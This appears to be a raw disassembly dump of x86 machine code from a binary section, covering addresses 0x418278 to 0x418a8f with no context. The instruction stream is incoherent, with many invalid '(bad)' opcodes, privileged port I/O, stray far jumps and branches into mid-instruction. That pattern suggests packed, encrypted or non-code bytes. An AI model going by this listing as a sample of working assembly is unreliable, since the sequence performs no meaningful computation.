  418278:	mov    ss,WORD PTR [edx+0x43]
  41827b:	xchg   edx,eax
  41827c:	or     cl,bh
  41827e:	stc    
  41827f:	(bad)  
  418280:	int    0x87
  418282:	cmp    bh,cl
  418284:	mov    ds:0xa0b88f99,al
  418289:	cmp    esi,DWORD PTR [esi-0x53059e9d]
  41828f:	or     BYTE PTR [eax-0x15],cl
  418292:	inc    ebp
  418293:	cmc    
  418294:	imul   edx,DWORD PTR [ebx+edi*8+0x606c8293],0x31d3d52e
  41829f:	lahf   
  4182a0:	mov    ecx,0x5f03bcb9
  4182a5:	inc    esi
  4182a6:	inc    edx
  4182a7:	lahf   
  4182a8:	and    DWORD PTR [ebx],eax
  4182aa:	jmp    0x395:0xaab0f633
  4182b1:	and    DWORD PTR [edx-0x25],ecx
  4182b4:	or     eax,0xbdad9ab3
  4182b9:	inc    esp
  4182ba:	ss popa 
  4182bc:	cmp    esi,ebx
  4182be:	jns    0x4182fa
  4182c0:	(bad)  
  4182c1:	in     al,0x4a
  4182c3:	aam    0x0
  4182c5:	addr16 retf 
  4182c7:	pop    ebx
  4182c8:	bound  ecx,QWORD PTR [esi-0x2905c235]
  4182ce:	loop   0x418326
  4182d0:	lock test bh,bh
  4182d3:	or     ebp,DWORD PTR [ecx+0x2959e905]
  4182d9:	out    0xaa,eax
  4182db:	mov    esi,0x586e6852
  4182e0:	mov    al,0xd0
  4182e2:	mov    ds:0x7d3f3cbd,al
  4182e7:	mov    WORD PTR [eax+0x64a97d42],cs
  4182ed:	mov    edi,0xc04d1345
  4182f2:	loope  0x418321
  4182f4:	xchg   ecx,eax
  4182f5:	jmp    0x41827e
  4182f7:	fdivr  DWORD PTR [ebx+0x6123acb0]
  4182fd:	bound  ebp,QWORD PTR [edi+0x1a]
  418300:	push   es
  418301:	pop    edx
  418302:	push   ss
  418303:	or     edx,ebx
  418305:	push   edi
  418306:	adc    edi,DWORD PTR [ebp-0x7]
  418309:	addr16 jl 0x418322
  41830c:	ss jecxz 0x418355
  41830f:	(bad)  
  418310:	std    
  418311:	fisubr WORD PTR [esi+0x68]
  418314:	xor    BYTE PTR [esp+eax*4-0x2a],al
  418318:	aas    
  418319:	test   eax,0x3f1a97f5
  41831e:	add    eax,0x5cebc118
  418323:	mov    ecx,0xecd32684
  418328:	push   0x72
  41832a:	pop    ss
  41832b:	scas   al,BYTE PTR es:[edi]
  41832c:	loopne 0x41834c
  41832e:	out    0xd6,eax
  418330:	jo     0x418345
  418332:	leave  
  418333:	fdivr  QWORD PTR [eax-0x72]
  418336:	call   0xc09194ee
  41833b:	jecxz  0x41833e
  41833d:	ret    
  41833e:	mov    eax,ds:0x4983d958
  418343:	stc    
  418344:	dec    eax
  418345:	or     edi,ebp
  418347:	or     eax,0x7efb619e
  41834c:	mov    dh,0xf7
  41834e:	in     al,dx
  41834f:	in     eax,dx
  418350:	inc    edx
  418351:	(bad)  
  418353:	mov    eax,0xfd06cbab
  418358:	retf   0xe297
  41835b:	in     eax,dx
  41835c:	sahf   
  41835d:	or     esp,DWORD PTR [eax-0xa]
  418360:	das    
  418361:	(bad)  
  418363:	mov    ecx,DWORD PTR [ecx]
  418365:	int3   
  418366:	sbb    bh,BYTE PTR [ebx]
  418368:	mov    WORD PTR [ebx-0x5c],ss
  41836b:	inc    edi
  41836c:	jg     0x4183d7
  41836e:	mov    esp,0xfbdf236f
  418373:	add    BYTE PTR [ebx+0x54],bh
  418376:	cli    
  418377:	mov    ah,0x79
  418379:	sbb    ah,ch
  41837b:	inc    esp
  41837c:	add    BYTE PTR [edx-0x6760a4d4],al
  418382:	fsubr  QWORD PTR [edi-0x6]
  418385:	retf   0xd5bf
  418388:	nop
  418389:	mov    bl,0x25
  41838b:	ret    
  41838c:	mov    ch,0x3c
  41838e:	inc    eax
  41838f:	sbb    esp,edi
  418391:	in     al,0xac
  418393:	xlat   BYTE PTR ds:[ebx]
  418394:	lahf   
  418395:	stos   BYTE PTR es:[edi],al
  418396:	push   ecx
  418397:	daa    
  418398:	push   ecx
  418399:	aas    
  41839a:	jb     0x41839d
  41839c:	sbb    cl,ch
  41839e:	retf   0xd8c6
  4183a1:	dec    eax
  4183a2:	sub    BYTE PTR [ebx+0x62],0xd8
  4183a6:	cmp    BYTE PTR [esi-0x56d560d7],ch
  4183ac:	xor    eax,0x40de111f
  4183b1:	fwait
  4183b2:	lahf   
  4183b3:	lds    esi,FWORD PTR [ebx-0x67a2dac0]
  4183b9:	stos   BYTE PTR es:[edi],al
  4183ba:	push   0x1
  4183bc:	sbb    BYTE PTR [edx-0x21],0x42
  4183c0:	dec    edi
  4183c1:	pop    es
  4183c2:	shl    BYTE PTR [edx],cl
  4183c4:	fbld   TBYTE PTR [ebp-0x78]
  4183c7:	adc    cl,dl
  4183c9:	jmp    0xff4b8000
  4183ce:	addr16 mov ebp,0x4352412e
  4183d4:	pop    ebp
  4183d5:	mov    edx,0x250f99f2
  4183da:	fcomp  DWORD PTR [eax+0x77]
  4183dd:	je     0x418377
  4183df:	xlat   BYTE PTR ds:[ebx]
  4183e0:	mov    ds:0x1fd8bca8,al
  4183e5:	jp     0x4183eb
  4183e7:	dec    edx
  4183e8:	mov    bh,0xaf
  4183ea:	cmp    esp,DWORD PTR [esi+0x16f316b0]
  4183f0:	fsubp  st(5),st
  4183f2:	sete   BYTE PTR [esi-0x6]
  4183f6:	push   ebp
  4183f7:	cwde   
  4183f8:	lods   al,BYTE PTR ds:[esi]
  4183f9:	aad    0xb0
  4183fb:	push   ecx
  4183fc:	xchg   edx,eax
  4183fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4183fe:	test   al,0x50
  418400:	pop    ecx
  418401:	icebp  
  418402:	(bad)  
  418403:	xor    edx,DWORD PTR [eax+0x26]
  418406:	and    esi,esp
  418408:	lahf   
  418409:	mov    WORD PTR [edx],es
  41840b:	pushf  
  41840c:	jl     0x4183b5
  41840e:	int    0xa9
  418410:	mov    ecx,0x40fe019
  418415:	ficom  DWORD PTR [edi-0x2a]
  418418:	xchg   esp,eax
  418419:	pop    esp
  41841a:	stos   BYTE PTR es:[edi],al
  41841b:	xor    cl,0x31
  41841e:	pop    eax
  41841f:	data16 or ch,BYTE PTR [edi-0x304cc85b]
  418426:	push   DWORD PTR [esi+ecx*8]
  418429:	sub    edx,DWORD PTR [esi-0x21]
  41842c:	idiv   cl
  41842e:	mov    ds:0xd46ea9bc,al
  418433:	(bad)  
  418434:	pop    eax
  418435:	push   0xf09bbcf3
  41843a:	fisttp QWORD PTR [eax-0x4eaa567d]
  418440:	or     ebp,esi
  418442:	or     eax,0xd93cc129
  418447:	rcr    BYTE PTR [edx+0x453e572f],cl
  41844d:	call   0x9f6a2ff7
  418452:	adc    DWORD PTR [ebp-0x53],edx
  418455:	adc    al,0xa8
  418457:	add    ah,BYTE PTR [eax-0x44]
  41845a:	push   ecx
  41845b:	imul   esp,DWORD PTR [ebp-0x5c691e9e],0x29f7c284
  418465:	in     eax,0xd0
  418467:	cs retf 0x4adc
  41846b:	or     esp,DWORD PTR [edx]
  41846d:	jo     0x418460
  41846f:	sub    esi,eax
  418471:	pushf  
  418472:	or     BYTE PTR [edi-0x61],0xa8
  418476:	push   esp
  418477:	cs jb  0x4184bf
  41847a:	mov    al,ds:0xcc2f7772
  41847f:	mov    cl,0xd0
  418481:	out    dx,al
  418482:	cs dec ebp
  418484:	push   0x1c3f0a2d
  418489:	ds cld 
  41848b:	inc    esi
  41848c:	mov    al,ds:0xffb10d08
  418491:	sub    bh,bh
  418493:	sub    eax,0x393ea92b
  418498:	rcl    BYTE PTR [eax-0xf],1
  41849b:	out    0x1b,al
  41849d:	lods   al,BYTE PTR ds:[esi]
  41849e:	cmc    
  41849f:	cmp    eax,0x217ec95a
  4184a4:	lea    edx,[ebp+edx*4+0x31411478]
  4184ab:	push   ds
  4184ac:	or     ah,ah
  4184ae:	aad    0x70
  4184b0:	data16 or al,0xff
  4184b3:	mov    ch,ch
  4184b5:	add    BYTE PTR [esi+0x27bd27be],cl
  4184bb:	or     eax,0x1bd99b9d
  4184c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184c1:	jno    0x4184bc
  4184c3:	and    BYTE PTR [ebx+eax*8],al
  4184c6:	dec    edx
  4184c7:	ror    BYTE PTR [eax+ebp*1+0x1e],0xbc
  4184cc:	fld    QWORD PTR [edi-0x520cfc44]
  4184d2:	mov    eax,ds:0x7ad24e0
  4184d7:	dec    ecx
  4184d8:	(bad)  
  4184d9:	(bad)  
  4184da:	lods   eax,DWORD PTR ds:[esi]
  4184db:	xor    eax,0x804116ca
  4184e0:	cld    
  4184e1:	je     0x4184b8
  4184e3:	jmp    0xc7b0c0cb
  4184e8:	mov    ebx,0x143143c2
  4184ed:	mov    edi,0xfc523fba
  4184f2:	idiv   DWORD PTR [esi+edx*1-0x55]
  4184f6:	iret   
  4184f7:	pop    esi
  4184f8:	rol    DWORD PTR [ebx],cl
  4184fa:	mov    eax,ds:0x585c77dc
  4184ff:	leave  
  418500:	pop    edi
  418501:	push   esp
  418502:	pop    ebp
  418503:	mov    esi,0x6d15aa45
  418508:	inc    ebp
  418509:	mov    ebp,0x8889f128
  41850e:	loope  0x418577
  418510:	in     eax,0xd3
  418512:	mov    esi,0x3ce12991
  418517:	sub    cl,BYTE PTR [ebp+0x53]
  41851a:	jbe    0x4184ce
  41851c:	lods   al,BYTE PTR ds:[esi]
  41851d:	dec    ebx
  41851e:	mov    ds:0x3e2ff017,eax
  418523:	(bad)  
  418524:	aas    
  418525:	push   0xdeba52eb
  41852a:	sti    
  41852b:	jns    0x41850a
  41852d:	xor    eax,0xe5f830b5
  418532:	xchg   ebp,eax
  418533:	iret   
  418534:	fs mov ah,0xae
  418537:	xchg   edx,eax
  418538:	mov    ds:0xbadc3e26,al
  41853d:	scas   eax,DWORD PTR es:[edi]
  41853e:	mov    esp,0xf5241ea8
  418543:	sbb    BYTE PTR [esi],bh
  418545:	ror    DWORD PTR [eax],0x7b
  418548:	shl    BYTE PTR ds:0x582aca06,0x37
  41854f:	test   eax,0xa3b89a52
  418554:	jge    0x41858a
  418556:	rcl    BYTE PTR [esi+0x3a0c539e],1
  41855c:	add    esi,eax
  41855e:	jo     0x418596
  418560:	cli    
  418561:	mov    ebx,0x27379b58
  418566:	stos   DWORD PTR es:[edi],eax
  418567:	or     BYTE PTR [edx-0x76],ch
  41856a:	lods   eax,DWORD PTR ds:[esi]
  41856b:	aad    0xbd
  41856d:	xchg   edx,eax
  41856e:	adc    BYTE PTR [edi-0x52],0x87
  418572:	adc    BYTE PTR [eax+edi*2],bl
  418575:	test   DWORD PTR [ebx+0x3c71a0d8],edi
  41857b:	and    al,BYTE PTR [esi-0x80]
  41857e:	(bad)  es:[ebp-0x46a8702b]
  418585:	mov    ds:0xf7ebc3ad,eax
  41858a:	pop    ebp
  41858b:	pop    edi
  41858c:	icebp  
  41858d:	sub    DWORD PTR [edx+edi*1+0x7f],ecx
  418591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418592:	shl    BYTE PTR [ecx+0x6c],0xb9
  418596:	mov    eax,0xc1f9896a
  41859b:	cdq    
  41859c:	mov    cl,0x24
  41859e:	sub    al,0xa
  4185a0:	outs   dx,BYTE PTR ds:[esi]
  4185a1:	ret    
  4185a2:	jae    0x41852b
  4185a4:	outs   dx,DWORD PTR ds:[esi]
  4185a5:	aam    0x62
  4185a7:	out    dx,eax
  4185a8:	jbe    0x4185b8
  4185aa:	pusha  
  4185ab:	add    ch,BYTE PTR [ebx+0x5b]
  4185ae:	pop    esi
  4185af:	push   esi
  4185b0:	pop    ebx
  4185b1:	lods   eax,DWORD PTR ds:[esi]
  4185b2:	inc    esi
  4185b3:	jbe    0x418621
  4185b5:	jge    0x4185b8
  4185b7:	aas    
  4185b8:	setge  ah
  4185bb:	(bad)
  4185be:	adc    BYTE PTR [edx-0x66cd7e46],al
  4185c4:	jb     0x41862b
  4185c6:	push   es
  4185c7:	xchg   esp,eax
  4185c8:	ret    
  4185c9:	call   0x93a7:0xf0233a17
  4185d0:	sbb    DWORD PTR [esp+edx*4],ecx
  4185d3:	xor    ah,ch
  4185d5:	hlt    
  4185d6:	sbb    cl,BYTE PTR [esi+0x10]
  4185d9:	dec    ebp
  4185da:	imul   edi,DWORD PTR [edx],0x23
  4185dd:	ss ins DWORD PTR es:[edi],dx
  4185df:	adc    ebp,DWORD PTR [ebx+eax*2+0x52]
  4185e3:	adc    DWORD PTR [ebx-0x4d],ebp
  4185e6:	mov    cl,0xfb
  4185e8:	js     0x41856e
  4185ea:	scas   al,BYTE PTR es:[edi]
  4185eb:	mov    eax,0xf8c53e0d
  4185f0:	push   esi
  4185f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4185f2:	sub    al,0xfd
  4185f4:	rcr    DWORD PTR [ebp+0x10a1f979],1
  4185fa:	or     edi,DWORD PTR [ecx]
  4185fc:	pop    edx
  4185fd:	adc    ch,BYTE PTR ds:0xc6de7600
  418603:	fcom   DWORD PTR [eax+0x57]
  418606:	das    
  418607:	mov    ch,0xa2
  418609:	push   ecx
  41860a:	sar    BYTE PTR [edi],1
  41860c:	fincstp 
  41860e:	rcr    BYTE PTR fs:[edx+0x79],cl
  418612:	pop    es
  418613:	call   0x39898b09
  418618:	jp     0x4185c6
  41861a:	push   edx
  41861b:	pop    es
  41861c:	data16 sbb al,0xd6
  41861f:	cmp    ebx,DWORD PTR [eax+0x2]
  418622:	daa    
  418623:	vpaddb ymm5,ymm4,ymm0
  418627:	and    ebp,DWORD PTR [ebx-0x5832fcf2]
  41862d:	fwait
  41862e:	jmp    0x25abda54
  418633:	clc    
  418634:	setge  BYTE PTR [eax+ebx*8]
  418638:	mov    eax,ds:0x6536de12
  41863d:	test   BYTE PTR [ecx-0x34],ah
  418640:	jp     0x418695
  418642:	daa    
  418643:	stc    
  418644:	test   esi,ecx
  418646:	(bad)  
  418647:	dec    BYTE PTR [edx+0x50]
  41864a:	or     ebx,DWORD PTR [eax]
  41864c:	add    edi,edx
  41864e:	push   ecx
  41864f:	and    DWORD PTR [edi],ecx
  418651:	mov    esi,0x4d14453d
  418656:	repnz mov ds:0x287ca129,al
  41865c:	or     DWORD PTR [eax+0x5a],esp
  41865f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  418661:	or     dl,BYTE PTR [edi+0x1fe8caa4]
  418667:	(bad)  
  418669:	sti    
  41866a:	pop    eax
  41866b:	ds lahf 
  41866d:	mov    edi,0xb238dbfc
  418672:	call   0xa0b9:0x88f10e41
  418679:	push   ds
  41867a:	cmp    al,0x2a
  41867c:	jp     0x418698
  41867e:	mov    DWORD PTR [edi-0x5a],ecx
  418681:	push   ebp
  418682:	lock mov ecx,0x8cee9629
  418688:	mov    ecx,0x63fb0d6
  41868d:	xchg   ebp,eax
  41868e:	and    ch,bh
  418690:	jl     0x418619
  418692:	xchg   ebx,eax
  418693:	push   ebp
  418694:	mov    al,ds:0x94197004
  418699:	(bad)  
  41869a:	xchg   esi,eax
  41869b:	es mov al,0xed
  41869e:	inc    edi
  41869f:	retf   
  4186a0:	xchg   BYTE PTR [edx],cl
  4186a2:	pop    esi
  4186a3:	xor    al,0x11
  4186a5:	add    al,0xe1
  4186a7:	lock xchg ebp,eax
  4186a9:	mov    bl,0xbf
  4186ab:	icebp  
  4186ac:	outs   dx,DWORD PTR ds:[esi]
  4186ad:	push   cs
  4186ae:	pusha  
  4186af:	ins    DWORD PTR es:[edi],dx
  4186b0:	repz fnstcw WORD PTR [bx+si+0x35]
  4186b5:	pop    es
  4186b6:	nop
  4186b7:	mov    edx,DWORD PTR [ecx]
  4186b9:	or     al,BYTE PTR [ebx+edx*2-0x30]
  4186bd:	pop    es
  4186be:	jmp    0xc0167894
  4186c3:	xchg   DWORD PTR [edx+0x3f4af18c],ebx
  4186c9:	std    
  4186ca:	jne    0x4186e1
  4186cc:	mov    ch,0xd6
  4186ce:	sbb    eax,0x79c3ef7b
  4186d3:	pop    ss
  4186d4:	xor    DWORD PTR [eax],0xffffffa4
  4186d7:	daa    
  4186d8:	dec    cl
  4186da:	enter  0x19ef,0xe
  4186de:	leave  
  4186df:	sbb    DWORD PTR [eax+0x7c9ba7d9],0x365d220
  4186e9:	sub    esi,DWORD PTR [esi-0x47]
  4186ec:	jecxz  0x4186cf
  4186ee:	das    
  4186ef:	push   ds
  4186f0:	inc    edx
  4186f1:	xchg   DWORD PTR [ebx-0x5c92948e],ebx
  4186f7:	xor    DWORD PTR [esi],0x109aca83
  4186fd:	lea    eax,[ebx+0x56109279]
  418703:	mov    ah,0x60
  418705:	pop    ecx
  418706:	call   0x4c83736a
  41870b:	adc    eax,0x89e529dc
  418710:	imul   DWORD PTR [ecx+0x73]
  418713:	and    BYTE PTR [esi],cl
  418715:	sbb    eax,0x45f5af15
  41871a:	add    eax,0xc353c70d
  418720:	leave  
  418721:	add    ebp,esi
  418723:	test   BYTE PTR [ecx],ch
  418725:	mov    BYTE PTR [edi+0x3a501e26],cl
  41872b:	adc    al,0x2
  41872d:	xlat   BYTE PTR ds:[ebx]
  41872e:	cmp    ebx,ebp
  418730:	cdq    
  418731:	popf   
  418732:	and    al,0xc8
  418734:	dec    eax
  418735:	inc    ebx
  418736:	sub    ebx,ebx
  418738:	add    edx,DWORD PTR [ecx-0x34e0ea3]
  41873e:	push   edx
  41873f:	je     0x41870d
  418741:	addr16 es push esp
  418744:	mov    ecx,DWORD PTR [edi+0x3fb28a3]
  41874a:	xlat   BYTE PTR ds:[ebx]
  41874b:	mov    esp,0xa91ff5d1
  418750:	inc    BYTE PTR [esi]
  418752:	mov    eax,0xf186a8c4
  418757:	jae    0x4187d0
  418759:	sbb    DWORD PTR [edx+0x45],eax
  41875c:	jnp    0x418742
  41875e:	adc    eax,0x96f8173a
  418763:	sti    
  418764:	icebp  
  418765:	xor    eax,0x5f8553e0
  41876a:	mov    bl,0xe
  41876c:	dec    edi
  41876d:	sub    eax,DWORD PTR [esi+0x11bf0f82]
  418773:	mov    eax,ds:0x9e46c6a4
  418778:	rol    BYTE PTR [ebp+0x3791c3f7],0xe4
  41877f:	sbb    ah,BYTE PTR [edi+0x4c67d442]
  418785:	inc    eax
  418786:	fucomip st,st(5)
  418788:	adc    dh,dl
  41878a:	xchg   edi,eax
  41878b:	sar    ebx,0xbb
  41878e:	jp     0x41877c
  418790:	arpl   WORD PTR [eax+0x25],bp
  418793:	repnz enter 0x40fa,0xb4
  418798:	inc    edi
  418799:	cmp    ecx,0xffffff85
  41879c:	mov    ebx,0xa4210eb4
  4187a1:	loope  0x41875b
  4187a3:	xchg   ah,bh
  4187a5:	jle    0x4187e9
  4187a7:	mov    bl,0x98
  4187a9:	add    esp,DWORD PTR [ebp+0x77]
  4187ac:	pop    edi
  4187ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187ae:	fistp  WORD PTR [ebp+ebx*8-0x78]
  4187b2:	out    0x13,al
  4187b4:	es jbe 0x4187db
  4187b7:	shr    eax,1
  4187b9:	imul   BYTE PTR [edx-0x4834d1d5]
  4187bf:	frstpm(287 only) 
  4187c1:	mov    ds:0x9940d711,al
  4187c6:	cmp    BYTE PTR [ebx],dl
  4187c8:	(bad)  
  4187ca:	push   esp
  4187cb:	xor    cl,dh
  4187cd:	ds mov eax,0xd7836999
  4187d3:	(bad)  
  4187d4:	aad    0x4e
  4187d6:	sub    eax,0x730fe632
  4187db:	and    al,0xb5
  4187dd:	in     eax,dx
  4187de:	push   esp
  4187df:	cmp    eax,0x5f4a4725
  4187e4:	std    
  4187e5:	test   esi,ebx
  4187e7:	imul   esp,esp,0x695477cd
  4187ed:	aaa    
  4187ee:	fs and bh,ch
  4187f1:	pop    edi
  4187f2:	mov    al,0x60
  4187f4:	jno    0x4187f3
  4187f6:	cmp    BYTE PTR [edi],bh
  4187f8:	out    0x19,al
  4187fa:	cmp    BYTE PTR [edx+0x27],ah
  4187fd:	retf   
  4187fe:	mov    edi,0xa2ed62f9
  418803:	ds ja  0x4187fc
  418806:	mov    ecx,DWORD PTR [ecx-0x41]
  418809:	repnz test al,0x67
  41880c:	adc    ch,ch
  41880e:	cmp    eax,0xa49ded94
  418813:	out    dx,eax
  418814:	xchg   edi,eax
  418815:	addr16 sahf 
  418817:	outs   dx,DWORD PTR ds:[esi]
  418818:	mov    cl,0x68
  41881a:	dec    esi
  41881b:	retf   0xce03
  41881e:	stos   BYTE PTR es:[edi],al
  41881f:	cli    
  418820:	sbb    al,BYTE PTR [ebp+ebp*8-0x31]
  418824:	imul   ebp,DWORD PTR [edi-0x6c7e5c71],0x4
  41882b:	jge    0x418833
  41882d:	lods   eax,DWORD PTR ds:[esi]
  41882e:	xlat   BYTE PTR ds:[ebx]
  41882f:	xchg   DWORD PTR [ebp-0x40],edi
  418832:	adc    al,bl
  418834:	les    eax,FWORD PTR [ebx+0x5f]
  418837:	inc    edx
  418838:	jle    0x41885b
  41883a:	cld    
  41883b:	xlat   BYTE PTR ds:[ebx]
  41883c:	call   0x8878:0x936261ea
  418843:	jle    0x418831
  418845:	lds    esi,FWORD PTR [edi+0x2]
  418848:	push   0x27
  41884a:	in     al,dx
  41884b:	sahf   
  41884c:	xchg   DWORD PTR [edx],eax
  41884e:	xchg   esi,eax
  41884f:	push   0x7c3d911
  418854:	call   0xe398:0xe8ce46d2
  41885b:	jno    0x4188cb
  41885d:	adc    dh,BYTE PTR [eax+0xae8bc7b]
  418863:	jp     0x418817
  418865:	clc    
  418866:	ins    DWORD PTR es:[edi],dx
  418867:	xor    DWORD PTR [edi+edi*1+0x2d45b851],0x66
  41886f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418870:	cli    
  418871:	(bad)  
  418873:	rol    BYTE PTR [esi],1
  418875:	jmp    0xce7c:0x45e62134
  41887c:	jno    0x41887d
  41887e:	iret   
  41887f:	mov    dh,0x1a
  418881:	(bad)  
  418882:	push   0xfffffff3
  418884:	je     0x418858
  418886:	test   eax,0xec4a4bff
  41888b:	mov    cl,bl
  41888d:	mov    bl,0xb1
  418890:	jecxz  0x4188a5
  418892:	(bad)  
  418893:	cmp    dh,BYTE PTR [ebx-0x13]
  418896:	xchg   edi,eax
  418897:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418899:	rcl    BYTE PTR [edi+0x7ba9ad43],0xae
  4188a0:	sahf   
  4188a1:	imul   ebx,edx,0x6faee8ed
  4188a7:	pop    ebp
  4188a8:	cwde   
  4188a9:	push   ss
  4188aa:	outs   dx,BYTE PTR ds:[esi]
  4188ab:	mul    BYTE PTR [ebx]
  4188ad:	xor    al,0x54
  4188af:	mov    bh,0x3e
  4188b1:	pop    ebp
  4188b2:	ss xor al,0x6e
  4188b5:	inc    esi
  4188b6:	addr16 push 0xdb04aed2
  4188bc:	and    al,0x38
  4188be:	add    eax,DWORD PTR [eax]
  4188c0:	jns    0x41887b
  4188c2:	xor    ebx,DWORD PTR [esi+0x66]
  4188c5:	add    al,BYTE PTR ds:0x9b4eba73
  4188cb:	pop    ebx
  4188cc:	xchg   ebx,eax
  4188cd:	and    DWORD PTR [ebx+0xd206b9e],edx
  4188d3:	jp     0x418903
  4188d5:	repnz sahf 
  4188d7:	scas   al,BYTE PTR es:[edi]
  4188d8:	sub    eax,0x80640f0
  4188dd:	ficomp DWORD PTR [edi+0x34]
  4188e0:	test   eax,0xbe05ca8
  4188e5:	test   al,0x51
  4188e7:	cmc    
  4188e8:	jno    0x41892e
  4188ea:	jle    0x418921
  4188ec:	mov    eax,0x4f1f25b4
  4188f1:	add    ebp,DWORD PTR [esi-0x3771de33]
  4188f7:	cld    
  4188f8:	dec    eax
  4188f9:	(bad)  
  4188fa:	mov    al,BYTE PTR [esi-0x33]
  4188fd:	outs   dx,DWORD PTR ds:[esi]
  4188fe:	imul   esi,DWORD PTR [eax],0xfffffff7
  418901:	and    al,0xd6
  418903:	mov    eax,0xac7b57fb
  418908:	push   0x162166a
  41890d:	mov    esp,DWORD PTR [eax+0x4beee044]
  418913:	inc    eax
  418914:	xchg   esp,eax
  418915:	idiv   BYTE PTR [ebx+0x74]
  418918:	ja     0x4188a5
  41891a:	xor    eax,0x1f9b8a6b
  41891f:	sti    
  418920:	not    DWORD PTR [esi+ebx*2+0x393b7de8]
  418927:	adc    eax,DWORD PTR [eax+eiz*1+0x728e5441]
  41892e:	scas   eax,DWORD PTR es:[edi]
  41892f:	jno    0x418925
  418931:	es push ebp
  418933:	lods   al,BYTE PTR ds:[esi]
  418934:	dec    edx
  418935:	add    BYTE PTR [edx],0x39
  418938:	ret    0x6613
  41893b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41893c:	and    DWORD PTR [ebx+0x5bdfd77b],edx
  418942:	dec    ebp
  418943:	pop    ecx
  418944:	ror    BYTE PTR [edi+0x61de6ea0],1
  41894a:	cmp    esi,edx
  41894c:	mov    cl,0xd5
  41894e:	pop    edx
  41894f:	das    
  418950:	pop    ecx
  418951:	jbe    0x4188e4
  418953:	add    ah,BYTE PTR [ecx-0x36]
  418956:	hlt    
  418957:	(bad)  
  418958:	(bad)  
  418959:	adc    eax,0x11e74fe2
  41895e:	and    eax,0x34474413
  418963:	pop    ebx
  418964:	jbe    0x418904
  418966:	push   edi
  418967:	test   eax,0x1f75944
  41896c:	sbb    DWORD PTR [edi+ebp*8],eax
  41896f:	shl    edx,0x7b
  418972:	jnp    0x418905
  418974:	adc    ah,BYTE PTR [esi+ebx*8-0x626180b9]
  41897b:	fucom  st(0)
  41897d:	cwde   
  41897e:	hlt    
  41897f:	xchg   al,ch
  418981:	popa   
  418982:	sar    edx,cl
  418984:	arpl   WORD PTR [eax],cx
  418986:	dec    di
  418988:	xor    bl,BYTE PTR [ebx+ebx*8-0x644b94eb]
  41898f:	test   BYTE PTR [ecx+0x30],bl
  418992:	data16 mov ds:0x513227fd,al
  418998:	es ja  0x4189e7
  41899b:	inc    edi
  41899c:	cwde   
  41899d:	popa   
  41899e:	ror    BYTE PTR [ebx-0x57e31ea5],0xd8
  4189a5:	xchg   BYTE PTR ds:0x80de0b78,cl
  4189ab:	pop    esi
  4189ac:	jmp    0x819f:0xfeff6ac1
  4189b3:	arpl   WORD PTR [esi+0x61f344d4],dx
  4189b9:	scas   eax,DWORD PTR es:[edi]
  4189ba:	add    eax,0xb741b1e7
  4189bf:	call   0xa112c9ab
  4189c4:	rcr    BYTE PTR [esi-0x44],1
  4189c7:	jae    0x418965
  4189c9:	test   al,0x4c
  4189cb:	add    eax,0x69ca55ea
  4189d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189d1:	call   0xa7e6:0xef7fe68f
  4189d8:	dec    esp
  4189d9:	jp     0x4189a2
  4189db:	int3   
  4189dc:	addr16 sub esp,ebx
  4189df:	aam    0x25
  4189e1:	lods   eax,DWORD PTR ds:[esi]
  4189e2:	repnz push ebp
  4189e4:	pop    edi
  4189e5:	jecxz  0x4189fb
  4189e7:	inc    ebp
  4189e8:	int3   
  4189e9:	sbb    eax,0x870f2802
  4189ee:	loopne 0x418a31
  4189f0:	out    0x39,al
  4189f2:	inc    esi
  4189f3:	cld    
  4189f4:	in     eax,0xba
  4189f6:	dec    ebx
  4189f7:	repz sahf 
  4189f9:	pop    esp
  4189fa:	xchg   esi,eax
  4189fb:	mov    edi,0x161b3bd4
  418a00:	test   bh,bh
  418a02:	mov    cl,0xf7
  418a04:	js     0x418987
  418a06:	jb     0x418988
  418a08:	or     DWORD PTR [ebp-0x22],0x65
  418a0c:	shr    BYTE PTR ds:0x3e0dc936,1
  418a12:	pop    edx
  418a13:	(bad)  [edx+0x62]
  418a16:	scas   al,BYTE PTR es:[edi]
  418a17:	jo     0x418a61
  418a19:	out    0x17,al
  418a1b:	in     al,0x1
  418a1d:	cmp    eax,eax
  418a1f:	inc    esi
  418a20:	inc    esi
  418a21:	dec    esi
  418a22:	or     BYTE PTR [ecx-0x38],bh
  418a25:	leave  
  418a26:	les    esp,FWORD PTR [ebx-0x35f475b1]
  418a2c:	inc    ebx
  418a2d:	adc    DWORD PTR [edx+0x4b3382a0],ecx
  418a33:	mov    ss,WORD PTR [edi]
  418a35:	inc    esi
  418a36:	arpl   WORD PTR [ecx+edi*4+0x31],ax
  418a3a:	or     al,0x21
  418a3c:	push   ecx
  418a3d:	mov    ds:0x1f8bc533,eax
  418a42:	daa    
  418a43:	(bad)  
  418a45:	loopne 0x418ab1
  418a47:	adc    al,0xb0
  418a49:	popf   
  418a4a:	adc    DWORD PTR [ebp-0xc79189],ecx
  418a50:	pop    es
  418a51:	jmp    0xad12678c
  418a56:	inc    ecx
  418a57:	(bad)  
  418a58:	xlat   BYTE PTR ds:[ebx]
  418a59:	jge    0x418a39
  418a5b:	adc    bl,BYTE PTR [esi+0x2cd6b7aa]
  418a61:	cmp    DWORD PTR [edi],0xa5552edb
  418a67:	call   0x6d47459f
  418a6c:	clc    
  418a6d:	inc    edi
  418a6e:	and    DWORD PTR [ebx-0x4d],esi
  418a71:	inc    esi
  418a72:	sbb    eax,0xe55a72f4
  418a77:	pop    es
  418a78:	sbb    esi,DWORD PTR [edx-0x6e]
  418a7b:	lods   al,BYTE PTR ds:[esi]
  418a7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a7d:	pop    edi
  418a7e:	test   DWORD PTR [esi],edx
  418a80:	xor    DWORD PTR [ecx-0x45bee8d7],ecx
  418a86:	jecxz  0x418ad9
  418a88:	sti    
  418a89:	ret    0xc5ea
  418a8c:	and    BYTE PTR [ecx],0x61
  418a8f:	xor    bl,ah
